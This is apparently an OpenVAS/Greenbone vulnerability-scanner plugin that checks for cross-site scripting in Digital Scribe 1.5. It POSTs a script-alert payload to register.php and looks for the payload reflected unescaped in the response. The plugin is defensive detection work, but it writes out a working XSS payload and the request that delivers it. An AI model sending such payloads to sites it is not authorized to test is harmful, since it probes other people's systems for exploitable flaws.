# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802128");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2011-08-05 09:04:20 +0200 (Fri, 05 Aug 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("Digital Scribe Multiple Cross Site Scripting Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/37715/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/48945");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17590/");
  script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5030.php");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute HTML code
  into user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"Digital Scribe version 1.5");

  script_tag(name:"insight", value:"The flaws are due to inputs passed through POST parameters 'title',
  'last' and 'email' in 'register.php' are not sanitized before being returned to the user.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Digital Scribe is prone to multiple cross site scripting vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

dsPort = http_get_port(default:80);

if(!http_can_host_php(port:dsPort)) {
  exit(0);
}

host = http_host_name(port:dsPort);

foreach path (make_list_unique("/DigitalScribe", "/digitalscribe", http_cgi_dirs(port:dsPort)))
{

  if(path == "/") path = "";

  rcvRes = http_get_cache(item:path + "/index.php", port:dsPort);

  if("<TITLE>Digital Scribe</TITLE>" >< rcvRes)
  {
    exp = 'title="><script>alert("XSS")</script>&last="><script>alert("XSS")' +
           '</script>&passuno=&passuno2=&email=&action=4&Submit=Register';

    req = string("POST ", path, "/register.php HTTP/1.1\r\n",
                 "Host: ",host,"\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(exp), "\r\n\r\n",
                 exp);
    res = http_keepalive_send_recv(port:dsPort, data:req);

    if(res =~ "^HTTP/1\.[01] 200" && '><script>alert("XSS")</script>' >< res)
    {
      security_message(port:dsPort);
      exit(0);
    }
  }
}

exit(99);
